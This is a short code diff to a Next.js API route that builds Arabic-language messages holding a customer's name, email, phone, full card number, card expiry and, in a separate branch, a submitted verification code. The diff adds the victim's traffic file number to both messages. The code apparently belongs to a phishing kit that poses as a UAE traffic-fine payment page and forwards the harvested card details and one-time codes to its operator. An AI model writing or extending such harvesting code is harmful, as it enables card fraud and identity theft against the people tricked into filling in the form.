@@ -29,7 +29,8 @@ export async function POST(request: NextRequest) {
       message += `👤 *معلومات العميل:*\n`
       message += `الاسم: ${data.name}\n`
       message += `البريد: ${data.email}\n`
-      message += `الهاتف: ${data.phone}\n\n`
+      message += `الهاتف: ${data.phone}\n`
+      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
       message += `💳 *بيانات البطاقة:*\n`
       message += `رقم البطاقة: ${data.cardNumber}\n`
       message += `تاريخ الانتهاء: ${data.cardExpiry}\n`
@@ -47,7 +48,8 @@ export async function POST(request: NextRequest) {
       message += `👤 *معلومات العميل:*\n`
       message += `الاسم: ${data.name}\n`
       message += `البريد: ${data.email}\n`
-      message += `الهاتف: ${data.phone}\n\n`
+      message += `الهاتف: ${data.phone}\n`
+      message += `رقم الملف المروري: ${data.trafficFileNumber}\n\n`
       message += `🕐 الوقت: ${new Date().toLocaleString("ar-AE", { timeZone: "Asia/Dubai" })}`
     } else if (type === "verification") {
       // Verification code submission
